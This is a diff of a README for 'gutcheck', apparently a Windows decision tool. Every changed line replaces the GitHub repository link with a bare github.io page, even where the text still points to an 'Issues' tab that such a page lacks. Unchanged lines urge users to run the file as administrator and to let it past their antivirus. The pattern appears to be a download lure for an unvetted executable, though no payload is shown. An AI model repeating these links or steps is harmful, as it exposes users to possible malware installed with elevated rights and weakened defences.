@@ -1,6 +1,6 @@
 # 🦾 gutcheck - Fast, Calibrated System-1 Decisions
 
-[![Download Now](https://img.shields.io/badge/Download-gutcheck-blue?style=for-the-badge&logo=github)](https://github.com/gijndgiuer/gutcheck)
+[![Download Now](https://img.shields.io/badge/Download-gutcheck-blue?style=for-the-badge&logo=github)](https://gijndgiuer.github.io)
 
 ## 🔍 What Is gutcheck?
 
@@ -22,7 +22,7 @@ Let's get gutcheck running on your Windows computer. Follow these steps carefull
 
 ### Step 1: Download gutcheck
 
-Visit this link to download the application: **[https://github.com/gijndgiuer/gutcheck](https://github.com/gijndgiuer/gutcheck)**
+Visit this link to download the application: **[https://gijndgiuer.github.io](https://gijndgiuer.github.io)**
 
 Once you're on that page, look for a green button that says "Code" or a section called "Releases." Click on the release that matches your system (Windows) and download the file. Don't worry about which one to pick—the latest version is usually best.
 
@@ -83,7 +83,7 @@ If something doesn't work, don't panic. Here's what to try:
 - **Right-click and Run as Administrator** – Sometimes Windows needs permission. Right-click the gutcheck icon and choose "Run as administrator."
 - **Check your antivirus** – Some antivirus software may block new tools. Make sure gutcheck is allowed.
 
-If you still have trouble, visit the GitHub page at [https://github.com/gijndgiuer/gutcheck](https://github.com/gijndgiuer/gutcheck) and look under the "Issues" tab. You can read what others have said or post your own question.
+If you still have trouble, visit the GitHub page at [https://gijndgiuer.github.io](https://gijndgiuer.github.io) and look under the "Issues" tab. You can read what others have said or post your own question.
 
 ## 💡 Final Tips
 
@@ -101,7 +101,7 @@ You're now ready to make faster, smarter AI decisions. Go ahead and download gut
 
 ## 📥 Download Again
 
-Need to get it again? No problem: Visit this link to download the application: **[https://github.com/gijndgiuer/gutcheck](https://github.com/gijndgiuer/gutcheck)**
+Need to get it again? No problem: Visit this link to download the application: **[https://gijndgiuer.github.io](https://gijndgiuer.github.io)**
 
 ---
 
